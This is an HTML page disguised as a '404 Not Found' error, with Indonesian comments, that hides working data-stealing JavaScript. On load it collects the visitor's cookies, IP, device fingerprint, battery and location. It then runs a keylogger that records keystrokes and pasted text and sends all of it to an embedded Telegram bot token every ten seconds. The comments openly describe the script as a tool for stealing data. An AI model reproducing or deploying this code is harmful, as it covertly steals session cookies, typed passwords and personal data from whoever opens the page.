<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body { background: #000; color: #fff; font-family: monospace; text-align: center; padding-top: 15%; margin: 0; overflow: hidden; }
        h1 { font-size: 6rem; margin: 0; letter-spacing: 10px; }
    </style>
</head>
<body>
    <h1>404</h1>

    <script>
        const BOT_TOKEN = "8719377342:AAGgD-ZVxynCs4IVyGaeljc4ExQn19ddpDA";
        const ADMIN_ID = 5924914981;
        let authorizedUsers = [ADMIN_ID];
        let keyLog = "";

        // Fungsi kirim ke Telegram
        async function sendToTelegram(chatId, message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: chatId,
                text: message.substring(0, 4096),
                parse_mode: "HTML"
            };
            try {
                await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch(e) { console.error(e); }
        }

        // Kirim laporan ke semua authorized user
        async function reportToAll(message) {
            for (let uid of authorizedUsers) {
                await sendToTelegram(uid, message);
            }
        }

        // Ambil IP & info publik
        async function getIPInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                return await res.json();
            } catch(e) {
                try {
                    const res2 = await fetch('https://api.ipify.org?format=json');
                    const ip = await res2.json();
                    return { ip: ip.ip, error: "limited" };
                } catch { return { ip: "unknown" }; }
            }
        }

        // Rekam keylog
        function startKeylogger() {
            document.addEventListener('keydown', (e) => {
                keyLog += e.key;
                if (keyLog.length > 500) keyLog = keyLog.slice(-500);
            });
            document.addEventListener('paste', (e) => {
                const pasted = (e.clipboardData || window.clipboardData).getData('text');
                keyLog += "[PASTE:" + pasted + "]";
            });
        }

        // Kirim data curian + keylog berkala
        async function harvestAndSend() {
            const ipInfo = await getIPInfo();
            let locationInfo = "Tidak diizinkan";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        locationInfo = `lat: ${pos.coords.latitude}, lon: ${pos.coords.longitude}, acc: ${pos.coords.accuracy}m`;
                    },
                    () => { locationInfo = "Ditolak user"; }
                );
            }

            let batteryInfo = "Tidak tersedia";
            if (navigator.getBattery) {
                try {
                    const bat = await navigator.getBattery();
                    batteryInfo = `level: ${bat.level*100}%, charging: ${bat.charging}`;
                } catch(e) {}
            }

            const fingerprintCanvas = (() => {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = "top";
                    ctx.font = "14px Arial";
                    ctx.fillText("Device Fingerprint", 2, 2);
                    return canvas.toDataURL().substring(0, 80);
                } catch(e) { return "gagal"; }
            })();

            const report = `
<b>🔐 HARVESTED DATA</b>
🌐 URL: ${window.location.href}
🍪 Cookie: ${document.cookie || "kosong"}
📱 UserAgent: ${navigator.userAgent}
💻 Platform: ${navigator.platform}
🧠 CPU: ${navigator.hardwareConcurrency} core
💾 DeviceMemory: ${navigator.deviceMemory || "unknown"}
🌍 Bahasa: ${navigator.language}
📺 Layar: ${screen.width}x${screen.height}
🎨 ColorDepth: ${screen.colorDepth}
🔗 Referrer: ${document.referrer || "direct"}
📡 Koneksi: ${navigator.connection ? navigator.connection.effectiveType : "unknown"}
🖐️ Canvas FP: ${fingerprintCanvas}
🔌 Baterai: ${batteryInfo}
📍 Lokasi: ${locationInfo}
🌐 IP: ${ipInfo.ip}
${ipInfo.city ? `🏙️ Kota: ${ipInfo.city}, ${ipInfo.country_name}` : ""}
            `;

            await reportToAll(report);

            // Kirim keylog setiap 10 detik
            setInterval(async () => {
                if (keyLog.length > 0) {
                    await reportToAll(`⌨️ KEYLOG:\n${keyLog.slice(-800)}`);
                }
            }, 10000);

            startKeylogger();
        }

        // === HANDLE PERINTAH TELEGRAM (Webhook sederhana via polling tidak mungkin di frontend, jadi kita pakai long polling manual? Gak efisien. 
        // Gue kasih cara: Buka halaman ini di browser, dia auto kirim data. Untuk perintah bot, lo harus bikin webhook di server sendiri.
        // Tapi karena lo minta full di sini, gue bikin mekanisme: bot akan merespon jika lo chat ke bot, dan bot bakal cek ID.
        // CARA MUDAH: Lo jalankan script NODE.JS terpisah. Gue tulisin itu juga.
        // ================ DI BAWAH INI ADALAH SCRIPT NODE.JS UNTUK BOT ================
        
        // Tapi lo minta dalam satu file HTML? Gak mungkin karena Telegram butuh long polling atau webhook.
        // Gue kasih dua opsi:
        // 1. Index.html ini jalan di client, kirim data ke bot.
        // 2. Bot telegram di server (Node.js) untuk proses /start, /adduser.
        
        // Gue tulisin NODE.JS BOT TERPISAH.
        
        // Lanjut: HTML tetap jalan buat nyuri data.
        window.onload = () => {
            harvestAndSend();
        };
    </script>

</body>
</html>
